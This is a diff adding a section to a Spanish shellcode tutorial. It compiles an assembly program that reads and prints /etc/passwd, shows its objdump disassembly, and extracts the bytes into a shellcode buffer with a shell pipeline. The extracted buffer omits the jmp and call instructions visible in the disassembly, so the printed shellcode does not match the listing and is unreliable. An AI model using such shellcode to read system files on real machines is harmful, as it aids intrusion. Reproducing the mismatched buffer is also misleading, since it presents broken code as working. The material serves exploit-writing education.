@@ -273,7 +273,76 @@ En los comentarios del código explica los valores que deben tener los registros
 
 Enlaces a la lista completa de las llamadas a sistema para [32bits](http://syscalls.kernelgrok.com/) y para [64bits](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
 
+Compilamos como en el ejemplo anterior:
 
+```
+nasm -f elf readfile.asm
+ld -o readfile readfile.o
+
+./readfile
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+....
+```
+
+Aquí se puede ver el shellcode a generar:
+
+```
+objdump -M intel -d readfile
+
+readfile:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 <_start>:
+  400080:       eb 3b                   jmp    4000bd <_push_filename>
+
+0000000000400082 <_readfile>:
+  400082:       5f                      pop    rdi
+  400083:       48 31 c0                xor    rax,rax
+  400086:       04 02                   add    al,0x2
+  400088:       48 31 f6                xor    rsi,rsi
+  40008b:       0f 05                   syscall
+  40008d:       66 81 ec ff 0f          sub    sp,0xfff
+  400092:       48 8d 34 24             lea    rsi,[rsp]
+  400096:       48 89 c7                mov    rdi,rax
+  400099:       48 31 d2                xor    rdx,rdx
+  40009c:       66 ba ff 0f             mov    dx,0xfff
+  4000a0:       48 31 c0                xor    rax,rax
+  4000a3:       0f 05                   syscall
+  4000a5:       48 31 ff                xor    rdi,rdi
+  4000a8:       40 80 c7 01             add    dil,0x1
+  4000ac:       48 89 c2                mov    rdx,rax
+  4000af:       48 31 c0                xor    rax,rax
+  4000b2:       04 01                   add    al,0x1
+  4000b4:       0f 05                   syscall
+  4000b6:       48 31 c0                xor    rax,rax
+  4000b9:       04 3c                   add    al,0x3c
+  4000bb:       0f 05                   syscall
+
+00000000004000bd <_push_filename>:
+  4000bd:       e8 c0 ff ff ff          call   400082 <_readfile>
+
+00000000004000c2 <path>:
+  4000c2:       2f                      (bad)
+  4000c3:       65                      gs
+  4000c4:       74 63                   je     400129 <path+0x67>
+  4000c6:       2f                      (bad)
+  4000c7:       70 61                   jo     40012a <path+0x68>
+  4000c9:       73 73                   jae    40013e <path+0x7c>
+  4000cb:       77 64                   ja     400131 <path+0x6f>
+```
+
+Para extraer el shellcode en formato buffer:
+
+```
+ objdump -d ./readfile|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+ 
+"\x5f\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+```
 
 *That's all folks!*
 
